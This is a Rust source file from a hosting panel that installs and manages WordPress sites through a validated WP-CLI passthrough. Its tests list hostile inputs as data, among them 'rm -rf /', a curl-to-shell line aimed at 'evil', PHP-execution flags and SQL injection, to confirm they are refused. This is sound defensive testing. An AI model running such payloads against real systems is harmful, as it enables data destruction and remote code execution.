        "define( 'DB_NAME', {} );\n",
        php_single_quoted(cfg.db_name)?
    ));
    out.push_str(&format!(
        "define( 'DB_USER', {} );\n",
        php_single_quoted(cfg.db_user)?
    ));
    out.push_str(&format!(
        "define( 'DB_PASSWORD', {} );\n",
        php_single_quoted(cfg.db_password)?
    ));
    out.push_str(&format!(
        "define( 'DB_HOST', {} );\n",
        php_single_quoted(cfg.db_host)?
    ));
    out.push_str("define( 'DB_CHARSET', 'utf8mb4' );\n");
    out.push_str("define( 'DB_COLLATE', '' );\n\n");

    for constant in SALT_CONSTANTS {
        out.push_str(&format!(
            "define( '{constant}', {} );\n",
            php_single_quoted(&random_secret(64))?
        ));
    }
    out.push('\n');

    out.push_str(&format!(
        "$table_prefix = {};\n\n",
        php_single_quoted(cfg.table_prefix)?
    ));

    // Hardening the spec asks for by name (§11.12 "basic hardening toggles"):
    // the theme/plugin file editor is a code-execution surface reachable from a
    // stolen admin session, and `FS_METHOD = direct` stops WordPress asking for
    // FTP credentials when it can already write its own directory.
    out.push_str("define( 'DISALLOW_FILE_EDIT', true );\n");
    out.push_str("define( 'FS_METHOD', 'direct' );\n");
    out.push_str("define( 'WP_DEBUG', false );\n\n");

    out.push_str("if ( ! defined( 'ABSPATH' ) ) {\n\tdefine( 'ABSPATH', __DIR__ . '/' );\n}\n\n");
    out.push_str("require_once ABSPATH . 'wp-settings.php';\n");
    Ok(out)
}

/// Write `wp-config.php` into the install directory **as the tenant**, mode
/// 0640.
///
/// 0640 rather than 0644: the file holds the database password, and on a
/// shared box the group is the tenant's own — the PHP-FPM pool runs as that
/// account, so the web server can read it and nobody else's account can.
async fn write_wp_config(target: &WpTarget, contents: &str) -> Result<()> {
    use crate::fsops::FsRunner;
    use crate::fsops::proto::FsRequest;

    let runner = match target.runner {
        WpRunner::Tenant { uid, gid } => FsRunner::Tenant { uid, gid },
        WpRunner::Local => FsRunner::Local,
    };
    let rel = PathBuf::from(target.rel.as_str()).join("wp-config.php");
    let bytes = contents.as_bytes().to_vec();

    runner
        .call(
            &target.home,
            FsRequest::Write {
                path: rel.clone(),
                len: bytes.len() as u64,
                create_parents: true,
                append: false,
            },
            bytes,
            Duration::from_secs(30),
        )
        .await?;
    runner
        .call(
            &target.home,
            FsRequest::Chmod {
                path: rel,
                mode: 0o640,
                recursive: false,
            },
            Vec::new(),
            Duration::from_secs(30),
        )
        .await?;
    Ok(())
}

// ---------------------------------------------------------------------------
// Small validated inputs
// ---------------------------------------------------------------------------

/// A WordPress locale, e.g. `en_US` or `fa_IR` (spec §11.12 names fa_IR).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(try_from = "String", into = "String")]
pub struct WpLocale(String);

impl WpLocale {
    pub fn parse(input: &str) -> Result<Self> {
        let s = input.trim();
        let ok = matches!(s.len(), 2..=8)
            && s.split('_').count() <= 2
            && s.bytes()
                .all(|b| b.is_ascii_alphabetic() || b == b'_' || b.is_ascii_digit());
        if !ok {
            return Err(FerrumError::new(
                ErrorCode::InvalidInput,
                format!("`{s}` is not a WordPress locale (expected e.g. `en_US` or `fa_IR`)"),
            )
            .with_field("locale"));
        }
        Ok(Self(s.to_string()))
    }

    pub fn as_str(&self) -> &str {
        &self.0
    }
}

impl Default for WpLocale {
    fn default() -> Self {
        Self("en_US".into())
    }
}

impl TryFrom<String> for WpLocale {
    type Error = FerrumError;
    fn try_from(v: String) -> Result<Self> {
        Self::parse(&v)
    }
}

impl From<WpLocale> for String {
    fn from(v: WpLocale) -> String {
        v.0
    }
}

/// A site title, as it reaches `wp core install`.
///
/// Titles are user-facing prose, so unlike a `wp.cli` argument they may be
/// Unicode — a Persian site is the point of shipping fa_IR. What they may not
/// contain is anything that ends a line or a shell word.
pub fn validate_title(title: &str) -> Result<&str> {
    let t = title.trim();
    if t.is_empty() || t.chars().count() > 200 {
        return Err(FerrumError::new(
            ErrorCode::InvalidInput,
            "a site title must be 1-200 characters",
        )
        .with_field("title"));
    }
    if t.chars().any(|c| c.is_control()) {
        return Err(FerrumError::new(
            ErrorCode::InvalidInput,
            "a site title may not contain control characters",
        )
        .with_field("title"));
    }
    if let Some(bad) = t.chars().find(|c| SHELL_METACHARACTERS.contains(c)) {
        return Err(FerrumError::new(
            ErrorCode::InvalidInput,
            format!("`{bad}` is not allowed in a site title"),
        )
        .with_field("title"));
    }
    Ok(t)
}

/// Derive a database (and database-user) name for a site.
///
/// `wp_<up-to-8 characters of the domain>_<6 random>`: legible in a `db.list`,
/// unique enough that two sites called `blog.*` do not collide, and short
/// enough for MySQL's 32-character account-name limit (18 characters at most).
pub fn derive_db_name(domain: &Domain) -> Result<DbName> {
    let stem: String = domain
        .as_str()
        .chars()
        .filter(|c| c.is_ascii_alphanumeric())
        .take(8)
        .collect();
    let suffix: String = {
        use rand::Rng;
        const ALPHABET: &[u8] = b"abcdefghijklmnopqrstuvwxyz0123456789";
        let mut rng = rand::thread_rng();
        (0..6)
            .map(|_| ALPHABET[rng.gen_range(0..ALPHABET.len())] as char)
            .collect()
    };
    DbName::parse(&format!("wp_{stem}_{suffix}"))
}

/// The URL WordPress should think it is served at.
fn site_url(site: &Site) -> String {
    let scheme = if site.force_https { "https" } else { "http" };
    format!("{scheme}://{}", site.domain)
}

// ---------------------------------------------------------------------------
// wp.detect
// ---------------------------------------------------------------------------

/// `wp.detect` — is there a WordPress here, and what is it?
pub struct Detect;

#[derive(Debug, Deserialize)]
pub struct DetectInput {
    pub site_id: i64,
    /// Look in a subdirectory of the document root instead of the root itself.
    #[serde(default)]
    pub subdirectory: Option<TenantPath>,
}

#[derive(Debug, Serialize)]
pub struct DetectOutput {
    pub site_id: i64,
    pub path: String,
    /// True when `wp-config.php` and `wp-load.php` are both present.
    pub detected: bool,
    /// The install row, if the panel has one. Absent for a WordPress the panel
    /// did not install (an import, or a tenant's own upload).
    #[serde(skip_serializing_if = "Option::is_none")]
    pub install: Option<WpInstall>,
    /// What `wp core version` said, when WP-CLI could be run at all.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub version: Option<String>,
    pub wp_cli_version: &'static str,
    /// See [`WP_CLI_SHA256`]: the pin has one source.
    pub wp_cli_pin_provenance: &'static str,
    pub wp_cli_installed: bool,
}

#[async_trait]
impl TypedOperation for Detect {
    type Input = DetectInput;
    type Output = DetectOutput;

    const NAME: &'static str = "wp.detect";
    const PERMISSION: Permission = Permission::SiteManage;
    const EXECUTION: Execution = Execution::Immediate;

    async fn run(&self, ctx: &OpContext, input: Self::Input) -> Result<Self::Output> {
        let site_id = SiteId(input.site_id);
        let target = target_for_site(ctx, site_id, input.subdirectory.as_ref()).await?;
        let install = ctx
            .db()
            .wp_installs(ctx.scope())
            .by_site(site_id)
            .await
            .map_err(FerrumError::from)?;

        // Presence is decided from the filesystem, not from the row: a panel
        // that reports "installed" because it has a row would be wrong exactly
        // when it matters (someone deleted the files).
        let detected =
            target.dir.join("wp-config.php").exists() && target.dir.join("wp-load.php").exists();

        let wp_cli_installed = phar_is_pinned(&paths::wp_cli_phar());
        let mut version = None;
        if detected && wp_cli_installed {
            // A failure here is *information*, not an error: a broken
            // installation is precisely what an operator opens this screen to
            // find out about, so it answers `version: null` rather than
            // refusing the whole call.
            if let Ok(out) = target
                .run(vec!["core".into(), "version".into()], IMMEDIATE_TIMEOUT)
                .await
                && out.success()
            {
                let reported = out.stdout.trim().to_string();
                if !reported.is_empty() {
                    if let Some(row) = &install {
                        let _ = ctx.db().set_wp_version(row.id, &reported).await;
                    }
                    version = Some(reported);
                }
            }
        }

        Ok(DetectOutput {
            site_id: input.site_id,
            path: target.dir.to_string_lossy().into_owned(),
            detected,
            install,
            version,
            wp_cli_version: WP_CLI_VERSION,
            wp_cli_pin_provenance: WP_CLI_PIN_PROVENANCE,
            wp_cli_installed,
        })
    }
}

// ---------------------------------------------------------------------------
// wp.install
// ---------------------------------------------------------------------------

/// `wp.install` — one-click WordPress (spec §11.12).
pub struct Install {
    fetcher: std::sync::Arc<dyn PharFetcher>,
}

impl Install {
    pub fn new(fetcher: std::sync::Arc<dyn PharFetcher>) -> Self {
        Self { fetcher }
    }

    pub fn live() -> Self {
        Self::new(std::sync::Arc::new(HttpsPharFetcher))
    }
}

#[derive(Debug, Deserialize)]
pub struct InstallInput {
    pub site_id: i64,
    /// Install into a subdirectory of the document root.
    #[serde(default)]
    pub subdirectory: Option<TenantPath>,
    /// `en_US` by default; `fa_IR` is a first-class case (spec §11.12).
    #[serde(default)]
    pub locale: WpLocale,
    pub title: String,
    /// The WordPress administrator's login name.
    pub admin_user: String,
    pub admin_email: Email,
    /// Unattended core updates for this install.
    #[serde(default)]
    pub auto_update: bool,
}

#[derive(Debug, Serialize)]
pub struct InstallOutput {
    pub install_id: i64,
    pub site_id: i64,
    pub path: String,
    pub url: String,
    pub version: String,
    pub locale: String,
    pub admin_user: String,
    /// The database the panel created and wired into `wp-config.php`.
    pub db_name: String,
    pub db_user: String,
    /// **No password is returned.** The database password lives in
    /// `wp-config.php` and can be rotated with `db.user.password`; the
    /// WordPress administrator password is generated, used once and discarded
    /// — see the operation's own comment for why neither may travel from here.
    pub credentials_note: &'static str,
}

/// What the caller is told instead of a password.
const CREDENTIALS_NOTE: &str = "No password is returned by wp.install. The database password is \
                                in wp-config.php (rotate it with db.user.password). The WordPress \
                                administrator password was generated and discarded — reset it \
                                with `wp.cli user update <user> --user_pass=…` or WordPress's own \
                                password-reset mail.";

#[async_trait]
impl TypedOperation for Install {
    type Input = InstallInput;
    type Output = InstallOutput;

    const NAME: &'static str = "wp.install";
    const PERMISSION: Permission = Permission::SiteManage;
    // Not idempotent: it creates a database and a database user, and re-running
    // it after a crash would try to create a second set. Not cancellable: the
    // dangerous moment is between "database created" and "install row written",
    // and a cancel there leaves exactly the orphan this operation unwinds by
    // hand on failure.
    const EXECUTION: Execution = Execution::Task {
        cancellable: false,
        idempotent: false,
    };

    async fn run(&self, ctx: &OpContext, input: Self::Input) -> Result<Self::Output> {
        let site_id = SiteId(input.site_id);
        let title = validate_title(&input.title)?.to_string();
        // The WordPress login name goes into an argv and into the database;
        // reuse the panel's own username rules rather than inventing a second
        // set that could disagree.
        let admin_user = ferrum_core::Username::parse(&input.admin_user)
            .map_err(|e| e.with_field("admin_user"))?;

        let target = target_for_site(ctx, site_id, input.subdirectory.as_ref()).await?;

        // Refuse to install over an existing one. Both halves matter: the row
        // (the panel already manages one here) and the files (somebody else
        // put a WordPress here, and `wp core download` would scatter over it).
        if ctx
            .db()
            .wp_installs(ctx.scope())
            .by_site(site_id)
            .await
            .map_err(FerrumError::from)?
            .is_some()
        {
            return Err(FerrumError::new(
                ErrorCode::AlreadyExists,
                "this site already has a WordPress installation recorded",
            ));
        }
        if target.dir.join("wp-config.php").exists() {
            return Err(FerrumError::new(
                ErrorCode::AlreadyExists,
                format!(
                    "{} already contains a wp-config.php; adopt it with wp.detect rather than \
                     installing over it",
                    target.dir.display()
                ),
            ));
        }

        let phar = ensure_wp_cli(ctx, self.fetcher.as_ref()).await?;
        ctx.log(format!("using WP-CLI at {}", phar.display()));

        // --- database and user, through the existing db.* operations --------
        // Not raw SQL: `db.user.create` already knows how to quote an
        // identifier, how to compensate a half-created row, and how to refuse a
        // name that exists outside the panel. Reimplementing any of that here
        // would be a second, worse copy.
        let name = derive_db_name(&Domain::parse(&target.site.domain)?)?;
        let db_user = crate::db::UserCreate
            .run(
                ctx,
                crate::db::UserCreateInput {
                    username: name.clone(),
                    engine: DbEngine::Mysql,
                    subscription_id: Some(target.subscription.id.get()),
                },
            )
            .await?;
        // From here on the password exists in exactly one place in memory and
        // must reach exactly one place on disk. It is never logged, never put
        // in an argv, and never returned.
        let db_password = db_user.password.clone();

        let created_db = match crate::db::Create
            .run(
                ctx,
                crate::db::CreateInput {
                    name: name.clone(),
                    engine: DbEngine::Mysql,
                    subscription_id: Some(target.subscription.id.get()),
                    owner: Some(name.clone()),
                },
            )
            .await
        {
            Ok(created) => created,
            Err(e) => {
                // Unwind the user, or the name is burned and the next attempt
                // fails on a leftover nobody can see.
                let _ = crate::db::UserDrop
                    .run(
                        ctx,
                        crate::db::UserDropInput {
                            username: name.clone(),
                        },
                    )
                    .await;
                return Err(e);
            }
        };
        ctx.log(format!("created database {}", created_db.name));

        // --- core files, wp-config.php, install ----------------------------
        let outcome = self
            .lay_down_wordpress(
                ctx,
                &target,
                &name,
                &db_password,
                &input.locale,
                &title,
                admin_user.as_str(),
                input.admin_email.as_str(),
            )
            .await;

        let version = match outcome {
            Ok(version) => version,
            Err(e) => {
                // Same compensation as above, in reverse creation order. The
                // files are deliberately left alone: they are the tenant's, the
                // failure text names the directory, and deleting a tree we only
                // partly wrote is how a panel eats somebody's data.
                let _ = crate::db::Drop
                    .run(
                        ctx,
                        crate::db::DropInput {
                            database_id: created_db.database_id,
                            confirm_name: created_db.name.clone(),
                        },
                    )
                    .await;
                let _ = crate::db::UserDrop
                    .run(
                        ctx,
                        crate::db::UserDropInput {
                            username: name.clone(),
                        },
                    )
                    .await;
                return Err(e);
            }
        };

        let row = ctx
            .db()
            .create_wp_install(NewWpInstall {
                site_id,
                path: target.dir.to_string_lossy().into_owned(),
                version: Some(version.clone()),
                db_id: Some(created_db.database_id),
                auto_update: input.auto_update,
            })
            .await
            .map_err(FerrumError::from)?;

        ctx.log(format!(
            "WordPress {version} installed at {}",
            target.dir.display()
        ));

        Ok(InstallOutput {
            install_id: row.id,
            site_id: input.site_id,
            path: row.path,
            url: site_url(&target.site),
            version,
            locale: input.locale.as_str().to_string(),
            admin_user: admin_user.as_str().to_string(),
            db_name: created_db.name,
            db_user: db_user.username,
            credentials_note: CREDENTIALS_NOTE,
        })
    }
}

impl Install {
    /// Download core, write the config, run the installer. Returns the version
    /// WordPress reports about itself afterwards.
    ///
    /// Split from `run` so the failure path has one place to unwind from.
    #[allow(clippy::too_many_arguments)]
    async fn lay_down_wordpress(
        &self,
        ctx: &OpContext,
        target: &WpTarget,
        db_name: &DbName,
        db_password: &str,
        locale: &WpLocale,
        title: &str,
        admin_user: &str,
        admin_email: &str,
    ) -> Result<String> {
        ctx.log(format!("downloading WordPress core ({})", locale.as_str()));
        target
            .run(
                vec![
                    "core".into(),
                    "download".into(),
                    format!("--locale={}", locale.as_str()),
                ],
                TASK_TIMEOUT,
            )
            .await?
            .into_result("wp core download")?;

        let config = render_wp_config(&WpConfig {
            db_name: db_name.as_str(),
            db_user: db_name.as_str(),
            db_password,
            // The socket-or-loopback question is settled by the stack: the
            // managed MariaDB listens on 127.0.0.1 only (see the wave-4 live
            // findings), and `localhost` is what every WordPress guide, plugin
            // and support article expects to see here.
            db_host: "localhost",
            table_prefix: "wp_",
        })?;
        write_wp_config(target, &config).await?;
        ctx.log("wrote wp-config.php (salts from a CSPRNG on this server)");

        // The administrator password is generated here and never leaves this
        // scope. It cannot be an *input*: task inputs are persisted verbatim in
        // `tasks.input_json`, which has no redaction (unlike audit details), so
        // a caller-supplied password would be stored in the clear forever. It
        // is not returned either: this is a task, and a task's output is not
        // delivered to the caller at all — only its log is, and a log is
        // exactly where a password must not be.
        //
        // It does appear in this one argv, and that is a real, acknowledged
        // exposure: `/proc/<pid>/cmdline` is world-readable for the seconds
        // `wp core install` runs. The database password — the credential that
        // lives on — is kept out of argv entirely for that reason, and closing
        // this last window means teaching the helper to feed WP-CLI's
        // `--prompt` on stdin, which is the follow-up.
        let admin_password = random_secret(32);
        target
            .run(
                vec![
                    "core".into(),
                    "install".into(),
                    format!("--url={}", site_url(&target.site)),
                    format!("--title={title}"),
                    format!("--admin_user={admin_user}"),
                    format!("--admin_email={admin_email}"),
                    format!("--admin_password={admin_password}"),
                    // Without this WordPress mails the address a "new site"
                    // notice containing a password-set link. The operator is
                    // standing in the panel; the mail relay may not even be
                    // configured yet (spec §11.18 is staged).
                    "--skip-email".into(),
                ],
                TASK_TIMEOUT,
            )
            .await?
            .into_result("wp core install")?;

        let version = target
            .run(vec!["core".into(), "version".into()], IMMEDIATE_TIMEOUT)
            .await?
            .into_result("wp core version")?;
        Ok(version.stdout.trim().to_string())
    }
}

// ---------------------------------------------------------------------------
// wp.update
// ---------------------------------------------------------------------------

/// `wp.update` — update WordPress core in place.
pub struct Update;

#[derive(Debug, Deserialize)]
pub struct UpdateInput {
    pub install_id: i64,
    /// Update to a specific core version instead of the latest.
    #[serde(default)]
    pub version: Option<String>,
    /// Also update the database schema (`wp core update-db`), which is what
    /// WordPress itself prompts for after a core update.
    #[serde(default = "default_true")]
    pub update_db: bool,
}

const fn default_true() -> bool {
    true
}

#[derive(Debug, Serialize)]
pub struct UpdateOutput {
    pub install_id: i64,
    pub from_version: Option<String>,
    pub to_version: String,
    pub database_updated: bool,
}

#[async_trait]
impl TypedOperation for Update {
    type Input = UpdateInput;
    type Output = UpdateOutput;

    const NAME: &'static str = "wp.update";
    const PERMISSION: Permission = Permission::SiteManage;
    // Idempotent: `wp core update` on an already-current install is a no-op
    // that exits 0, so a retry after an agent restart is safe.
    const EXECUTION: Execution = Execution::Task {
        cancellable: false,
        idempotent: true,
    };

    async fn run(&self, ctx: &OpContext, input: Self::Input) -> Result<Self::Output> {
        let (install, target) = target_for_install(ctx, input.install_id).await?;

        let mut args = vec!["core".to_string(), "update".to_string()];
        if let Some(version) = &input.version {
            // A version reaches an argv, so it goes through the same validator
            // the passthrough uses rather than a looser one written here.
            let checked = validate_arg(version)?;
            if !checked
                .bytes()
                .all(|b| b.is_ascii_digit() || b == b'.' || b == b'-')
            {
                return Err(FerrumError::new(
                    ErrorCode::InvalidInput,
                    "a WordPress version looks like `6.8.2`",
                )
                .with_field("version"));
            }
            args.push(format!("--version={checked}"));
        }

        ctx.log("updating WordPress core");
        target
            .run(args, TASK_TIMEOUT)
            .await?
            .into_result("wp core update")?;

        let mut database_updated = false;
        if input.update_db {
            target
                .run(vec!["core".into(), "update-db".into()], TASK_TIMEOUT)
                .await?
                .into_result("wp core update-db")?;
            database_updated = true;
        }

        let to_version = target
            .run(vec!["core".into(), "version".into()], IMMEDIATE_TIMEOUT)
            .await?
            .into_result("wp core version")?
            .stdout
            .trim()
            .to_string();
        let _ = ctx.db().set_wp_version(install.id, &to_version).await;

        Ok(UpdateOutput {
            install_id: install.id,
            from_version: install.version,
            to_version,
            database_updated,
        })
    }
}

// ---------------------------------------------------------------------------
// wp.plugin.list
// ---------------------------------------------------------------------------

/// `wp.plugin.list` — what is installed, and what has an update waiting.
pub struct PluginList;

#[derive(Debug, Deserialize)]
pub struct PluginListInput {
    pub install_id: i64,
}

#[derive(Debug, Serialize)]
pub struct PluginListOutput {
    pub install_id: i64,
    /// Straight from `wp plugin list --format=json`: name, status, version,
    /// update. Passed through as parsed JSON rather than re-modelled, because
    /// the fields WP-CLI reports are WordPress's to define, and a struct here
    /// would silently drop whatever it did not know about.
    pub plugins: serde_json::Value,
}

#[async_trait]
impl TypedOperation for PluginList {
    type Input = PluginListInput;
    type Output = PluginListOutput;

    const NAME: &'static str = "wp.plugin.list";
    const PERMISSION: Permission = Permission::SiteManage;
    const EXECUTION: Execution = Execution::Immediate;

    async fn run(&self, ctx: &OpContext, input: Self::Input) -> Result<Self::Output> {
        let (install, target) = target_for_install(ctx, input.install_id).await?;
        let out = target
            .run(
                vec![
                    "plugin".into(),
                    "list".into(),
                    "--format=json".into(),
                    // A plugin that fatals on load must not take the listing
                    // down with it: this is the screen an operator opens *to
                    // find* the broken plugin.
                    "--skip-plugins".into(),
                    "--skip-themes".into(),
                ],
                IMMEDIATE_TIMEOUT,
            )
            .await?
            .into_result("wp plugin list")?;

        let plugins = serde_json::from_str(out.stdout.trim()).map_err(|e| {
            FerrumError::new(
                ErrorCode::CommandFailed,
                format!("WP-CLI did not return JSON for the plugin list: {e}"),
            )
        })?;

        Ok(PluginListOutput {
            install_id: install.id,
            plugins,
        })
    }
}

// ---------------------------------------------------------------------------
// wp.plugin.update
// ---------------------------------------------------------------------------

/// `wp.plugin.update` — update named plugins, or all of them.
pub struct PluginUpdate;

#[derive(Debug, Deserialize)]
pub struct PluginUpdateInput {
    pub install_id: i64,
    /// Plugin slugs. Empty means every plugin with an update available.
    #[serde(default)]
    pub plugins: Vec<String>,
}

#[derive(Debug, Serialize)]
pub struct PluginUpdateOutput {
    pub install_id: i64,
    pub plugins: Vec<String>,
    pub all: bool,
    /// WP-CLI's own report, verbatim. Plugin updates partially succeed all the
    /// time (one plugin's download fails, four update fine), and a boolean
    /// would throw away the only description of which was which.
    pub output: String,
}

/// A plugin slug: WordPress's own alphabet for a plugin directory name.
fn validate_slug(slug: &str) -> Result<&str> {
    let checked = validate_arg(slug)?;
    if checked.starts_with('-')
        || !checked
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_' || b == b'.')
    {
        return Err(FerrumError::new(
            ErrorCode::InvalidInput,
            format!("`{slug}` is not a plugin slug"),
        )
        .with_field("plugins"));
    }
    Ok(checked)
}

#[async_trait]
impl TypedOperation for PluginUpdate {
    type Input = PluginUpdateInput;
    type Output = PluginUpdateOutput;

    const NAME: &'static str = "wp.plugin.update";
    const PERMISSION: Permission = Permission::SiteManage;
    // Idempotent: updating an already-current plugin is a no-op.
    const EXECUTION: Execution = Execution::Task {
        cancellable: false,
        idempotent: true,
    };

    async fn run(&self, ctx: &OpContext, input: Self::Input) -> Result<Self::Output> {
        let (install, target) = target_for_install(ctx, input.install_id).await?;
        if input.plugins.len() > MAX_CLI_ARGS {
            return Err(FerrumError::new(
                ErrorCode::InvalidInput,
                format!("at most {MAX_CLI_ARGS} plugins per call"),
            )
            .with_field("plugins"));
        }

        let mut args = vec!["plugin".to_string(), "update".to_string()];
        let all = input.plugins.is_empty();
        let mut slugs = Vec::with_capacity(input.plugins.len());
        if all {
            args.push("--all".into());
        } else {
            for slug in &input.plugins {
                let checked = validate_slug(slug)?;
                slugs.push(checked.to_string());
                args.push(checked.to_string());
            }
        }

        ctx.log(if all {
            "updating every plugin with an update available".to_string()
        } else {
            format!("updating {} plugin(s)", slugs.len())
        });

        let out = target
            .run(args, TASK_TIMEOUT)
            .await?
            .into_result("wp plugin update")?;

        Ok(PluginUpdateOutput {
            install_id: install.id,
            plugins: slugs,
            all,
            output: out.stdout,
        })
    }
}

// ---------------------------------------------------------------------------
// wp.cli
// ---------------------------------------------------------------------------

/// `wp.cli` — the restricted WP-CLI passthrough.
pub struct Cli;

#[derive(Debug, Deserialize)]
pub struct CliInput {
    pub install_id: i64,
    /// One of the allowed command groups.
    pub subcommand: WpSubcommand,
    /// Everything after the group. Validated by [`validate_arg`].
    #[serde(default)]
    pub args: Vec<String>,
}

#[derive(Debug, Serialize)]
pub struct CliOutput {
    pub install_id: i64,
    /// The exact argument vector WP-CLI received, `--path` included. Echoed so
    /// the caller can see what the panel decided on their behalf — there is no
    /// hidden rewriting.
    pub argv: Vec<String>,
    pub status: i32,
    pub stdout: String,
    pub stderr: String,
}

#[async_trait]
impl TypedOperation for Cli {
    type Input = CliInput;
    type Output = CliOutput;

    const NAME: &'static str = "wp.cli";
    const PERMISSION: Permission = Permission::SiteManage;
    // Immediate, because a passthrough whose output is thrown away (which is
    // what a task's output is — only its log survives) would not be a
    // passthrough. The cost is the 25-second ceiling; long-running work has its
    // own operations.
    const EXECUTION: Execution = Execution::Immediate;

    async fn run(&self, ctx: &OpContext, input: Self::Input) -> Result<Self::Output> {
        let (install, target) = target_for_install(ctx, input.install_id).await?;
        let args = validate_cli_args(input.subcommand, &input.args)?;
        let argv = wp_argv(&target.dir, args.clone());

        // A non-zero exit is *data* here: `wp option get missing_key` exits 1,
        // and a passthrough that turned that into an operation failure would
        // make half of WP-CLI unusable. The caller sees the status.
        let out = target.run(args, IMMEDIATE_TIMEOUT).await?;

        Ok(CliOutput {
            install_id: install.id,
            argv,
            status: out.status,
            stdout: out.stdout,
            stderr: out.stderr,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // -- the passthrough's refusals ----------------------------------------

    /// The claim `wp.cli` has to earn: a hostile argument cannot escape into
    /// anything but a literal WP-CLI argument.
    ///
    /// Two payload families, refused for two different reasons. The shell
    /// payloads are inert through argv — but WP-CLI builds its own
    /// `mysql`/`mysqldump` command lines for parts of `wp db`, so they are
    /// refused rather than trusted to stay inert. The WP-CLI payloads are the
    /// dangerous ones: `--require` and `--exec` are "run this PHP" spelled as
    /// flags, and would turn a restricted subcommand into arbitrary code
    /// execution as the tenant.
    #[test]
    fn a_hostile_argument_cannot_escape_the_passthrough() {
        let hostile = [
            // shell payloads
            "; rm -rf /",
            "&& curl http://evil/x | sh",
            "`id`",
            "$(id)",
            "a|b",
            "x > /etc/passwd",
            "x\nwp core download",
            "'; DROP TABLE wp_users; --",
            "*",
            // WP-CLI's own code-execution and redirection flags
            "--require=/tmp/pwn.php",
            "--exec=system('id');",
            "--ssh=root@evil",
            "--http=http://evil/",
            "--context=admin",
            "--prompt=admin_password",
            // the path override the panel reserves for itself
            "--path=/etc",
            "--path=/home/other/sites",
        ];

        for payload in hostile {
            let err = validate_cli_args(WpSubcommand::Core, &[payload.to_string()])
                .expect_err("expected a refusal for {payload:?}");
            assert_eq!(err.code, ErrorCode::InvalidInput, "{payload:?}");
            assert_eq!(err.field.as_deref(), Some("args"), "{payload:?}");
        }
    }

    /// The negated and abbreviated spellings must be refused too, or the
    /// denylist is decoration: `--no-path` and `--PATH` would both slip past a
    /// naive exact match.
    #[test]
    fn a_reserved_flag_cannot_be_smuggled_in_another_spelling() {
        for spelling in ["--no-path=/etc", "--no-require=x", "--no-exec=x"] {
            assert!(
                validate_cli_args(WpSubcommand::Core, &[spelling.to_string()]).is_err(),
                "{spelling} must be refused"
            );
        }
        // Upper case is not a WP-CLI flag shape at all, so it fails on the
        // well-formedness check rather than the denylist — either way it never
        // reaches WP-CLI.
        assert!(validate_cli_args(WpSubcommand::Core, &["--PATH=/etc".into()]).is_err());
    }

    /// Interactive second-level commands would block until the timeout, which
    /// is a denial of service dressed as a feature request.
    #[test]
    fn an_interactive_subcommand_is_refused_rather_than_left_to_hang() {
        assert!(validate_cli_args(WpSubcommand::Db, &["cli".into()]).is_err());
        // …while the rest of the group still works.
        assert!(validate_cli_args(WpSubcommand::Db, &["size".into()]).is_ok());
    }

    /// The group is an enum, so anything outside the eight allowed names fails
    /// at deserialization — before the operation body exists.
    #[test]
    fn only_the_allowlisted_command_groups_deserialize() {
        for allowed in [
            "core", "plugin", "theme", "option", "user", "db", "cache", "rewrite",
        ] {
            let parsed: WpSubcommand =
                serde_json::from_value(serde_json::json!(allowed)).expect("allowed group");
            assert_eq!(parsed.as_str(), allowed);
        }
        for refused in [
            "eval",
            "eval-file",
            "shell",
            "server",
            "package",
            "cli",
            "config",
        ] {
            assert!(
                serde_json::from_value::<WpSubcommand>(serde_json::json!(refused)).is_err(),
                "`{refused}` must not be a reachable command group"
            );
        }
    }

    /// The ordinary case still has to work, or the refusals above are just a
    /// broken feature.
    #[test]
    fn an_ordinary_call_survives_validation_unchanged() {
        let args = validate_cli_args(
            WpSubcommand::Option,
            &["get".into(), "blogname".into(), "--format=json".into()],
        )
        .expect("a plain option read is allowed");
        assert_eq!(args, vec!["option", "get", "blogname", "--format=json"]);
    }

    /// `--path` is prepended by the panel and is always the first argument, so
    /// nothing a caller sends can precede it.
    #[test]
    fn the_panel_decides_the_path_and_puts_it_first() {
        let argv = wp_argv(
            Path::new("/home/ft_x/sites/example.com/public"),
            vec!["core".into(), "version".into()],
        );
        assert_eq!(argv[0], "--path=/home/ft_x/sites/example.com/public");
        assert_eq!(&argv[1..], &["core", "version"]);
    }

    /// The positive half of the injection claim. Refusing hostile arguments is
    /// only half a passthrough; the other half is that an argument which
    /// legitimately contains a space stays **one** argv element rather than
    /// being split into two commands' worth of words. A space is not a
    /// metacharacter here precisely because argv makes word splitting
    /// impossible.
    #[test]
    fn a_value_containing_spaces_stays_a_single_argv_element() {
        let args = validate_cli_args(
            WpSubcommand::Option,
            &["update".into(), "blogname".into(), "My Great Shop".into()],
        )
        .expect("a spaced value is legitimate");
        let argv = wp_argv(Path::new("/home/ft_x/sites/d/public"), args);

        assert_eq!(argv.len(), 5, "{argv:?}");
        assert_eq!(argv[4], "My Great Shop");
    }

    #[test]
    fn an_over_long_argument_or_argument_list_is_refused() {
        let long = "a".repeat(MAX_ARG_LEN + 1);
        assert!(validate_arg(&long).is_err());
        let many: Vec<String> = (0..MAX_CLI_ARGS + 1).map(|i| format!("a{i}")).collect();
        assert!(validate_cli_args(WpSubcommand::Core, &many).is_err());
    }

    // -- wp-config.php ------------------------------------------------------

    /// The salts are the site's cookie-signing keys. Two installs sharing them
    /// would let either forge logins for the other.
    #[test]
    fn every_wp_config_gets_its_own_salts() {
        let cfg = |p: &str| {
            render_wp_config(&WpConfig {
                db_name: "wp_a_123456",
                db_user: "wp_a_123456",
                db_password: p,
                db_host: "localhost",
                table_prefix: "wp_",
            })
            .expect("renders")
        };
        let first = cfg("pw1");
        let second = cfg("pw2");

        for constant in SALT_CONSTANTS {
            let a = salt_of(&first, constant);
            let b = salt_of(&second, constant);
            assert_eq!(a.len(), 64, "{constant} must be 64 characters");
            assert_ne!(a, b, "{constant} must differ between installations");
        }
    }

    /// Every salt in one file must also differ from every other: WordPress uses
    /// them for different purposes and reusing one value across all eight
    /// collapses them into a single key.
    #[test]
    fn the_eight_salts_in_one_file_all_differ() {
        let rendered = render_wp_config(&WpConfig {
            db_name: "wp_a_123456",
            db_user: "wp_a_123456",
            db_password: "pw",
            db_host: "localhost",
            table_prefix: "wp_",
        })
        .expect("renders");
        let mut seen: Vec<String> = SALT_CONSTANTS
            .iter()
            .map(|c| salt_of(&rendered, c))
            .collect();
        seen.sort();
        let before = seen.len();
